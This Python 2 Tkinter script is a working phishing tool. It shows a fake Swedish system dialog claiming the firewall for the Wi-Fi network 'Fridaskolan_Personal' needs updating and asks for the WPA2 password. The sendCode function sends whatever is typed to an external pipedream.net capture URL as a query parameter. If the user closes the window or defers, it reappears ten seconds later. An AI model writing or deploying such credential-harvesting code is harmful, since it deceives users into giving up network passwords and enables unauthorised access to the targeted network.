# coding=utf_8

# import Tkinter
# import tkSimpleDialog
#
# parent = Tkinter.Tk()  # Create the object
# parent.overrideredirect(1)  # Avoid it appearing and then disappearing quickly
# parent.iconbitmap("PythonIcon.ico")  # Set an icon (this is optional - must be in a .ico format)
# parent.withdraw()  # Hide the window as we do not want to see this one
# # parent.mainloop()
# #
# # # After creating parent...
# #
# # from tkSimpleDialog import askstring
# # from tkMessageBox import showinfo
# # name = askstring('Name', 'What is your name?')
# # showinfo('Hello!', 'Hi, {}'.format(name))
# import ttk
# s=ttk.Style()
# print s.theme_names()


from Tkinter import *
from ttk import *
from time import sleep
import json
import urllib

class App():
    def __init__(self, master):
        frame = Frame(master)
        frame.pack()

        self.topFrame = Frame(frame)
        self.botFrame = Frame(frame)

        master.title(" ")
        self.titleLabel = Label(self.topFrame,
                                text="""Wi-Fi-nätverket "Fridaskolan_Personal" kräver ett\nWPA2-lösenord.""",
                                font='Helvetica 13 bold')
        self.descLabel = Label(self.topFrame,
                               text="""Brandväggen för ditt nätverk behöver uppdateras,\nsenast uppdaterad den 10e april 2017.""")
        self.descTwoLabel = Label(self.topFrame,
                                  text="""För att fortsätta så krävs det att du angiver\nlösenordet för ditt nätverk nedan.""")

        self.passwordLabel = Label(self.topFrame,
                                   text="""Lösenord:""",
                                   font='Helvetica 13 bold')
        self.passwordEntry = Entry(self.topFrame,
                                   width=36)

        self.hidePassVar = IntVar(value=0)
        self.hidePass = Checkbutton(self.topFrame,
                                    text="visa lösenord",
                                    variable=self.hidePassVar,
                                    command=(lambda: self.togglePass()))

        self.cancelBtn = Button(self.botFrame,
                                text="Senare", width=7,
                                command=doSomething)

        self.submitBtn = Button(self.botFrame,
                                text="Fortsätt", width=7,
                                command=self.sendIt)

        # self.img = PhotoImage(file="info.gif")
        # self.imageLabel = Label(self.topFrame, image=self.img, width=5)

        self.titleLabel.grid(row=0, column=1, sticky="nw")
        self.descLabel.grid(row=1, column=1, pady=(6, 0), sticky="nw")
        self.descTwoLabel.grid(row=2, column=1, pady=(4, 4), sticky="nw")
        self.passwordLabel.grid(row=3, column=0, pady=(4, 4), padx=(0, 4), sticky="nw")
        self.passwordEntry.grid(row=3, column=1, pady=(4, 4), sticky="nw")
        self.hidePass.grid(row=4, column=1, pady=(4, 4), sticky="nw")

        # self.cancelBtn.grid(row=0, column=0, pady=(4, 4), sticky="e")
        # self.submitBtn.grid(row=0, column=1, pady=(4, 4), sticky="e")
        self.submitBtn.pack(side=RIGHT, anchor=E)
        self.cancelBtn.pack()
        # self.imageLabel.grid(row=0, column=0, padx=(0, 10), sticky="w")
        # self.slogan.grid(row=1, column=0, sticky='e')
        # self.button.grid(row=1, column=1, sticky='e')

        # self.topFrame.grid(row=0, column=0, sticky='n', padx=(10, 30), pady=(10, 10))
        self.topFrame.pack(padx=(10, 30), pady=(10, 10))
        # self.botFrame.grid(row=1, column=0, columnspan=2, sticky='s', padx=(10, 30), pady=(0, 20))
        self.botFrame.pack(fill=Y, anchor=E, side=RIGHT, padx=(0, 10), pady=(0, 10))
        self.botFrame.pack_propagate(True)
        # self.botFrame.pack(side='right', fill='both', expand=True)
        # self.botFrame.grid_rowconfigure(0, weight=1)
        # self.botFrame.grid_columnconfigure(0, weight=1)

    def togglePass(self):
        if self.hidePassVar.get() is 1:
            self.passwordEntry.configure(show="*")
        else:
            self.passwordEntry.configure(show='')
        self.passwordEntry.update()
        print "hey"

    def sendIt(self):
        code = self.passwordEntry.get()
        sendCode(code)


def doSomething():
    global root
    root.iconify()
    root.destroy()
    sleep(10)
    again()


global root
global app


def again():
    global root
    global app
    root = Tk()
    root.style = Style()
    # ('clam', 'alt', 'default', 'classic')
    root.style.theme_use("aqua")
    root.resizable(False, False)

    app = App(root)

    # Gets the requested values of the height and width.
    windowWidth = root.winfo_reqwidth()
    windowHeight = root.winfo_reqheight()
    print("Width", windowWidth, "Height", windowHeight)

    # Gets both half the screen width/height and window width/height
    positionRight = int(root.winfo_screenwidth() / 2 - windowWidth / 2 - windowWidth / 2)
    positionDown = int(root.winfo_screenheight() / 2 - windowHeight / 2)

    # Positions the window in the center of the page.
    root.geometry("+{}+{}".format(positionRight, positionDown))
    # root.overrideredirect(True)
    root.protocol('WM_DELETE_WINDOW', doSomething)

    root.focus_force()
    root.after(1, lambda: root.focus_force())

    root.mainloop()

def sendCode(data):
    if data is not "":
        root.iconify()
        conditionsSetURL = 'https://enir9zpsoeuo.x.pipedream.net/'
        newUrl = conditionsSetURL + """?password=""" + data
        print newUrl
        response = urllib.urlopen(newUrl)
        exit(0)
    # newConditions = {"password":data}
    # params = json.dumps(newConditions).encode('utf8')
    # req = urllib.request.Request(conditionsSetURL, data=params,
    #                              headers={'content-type': 'application/json'})
    # response = urllib.urlopen(req)

again()
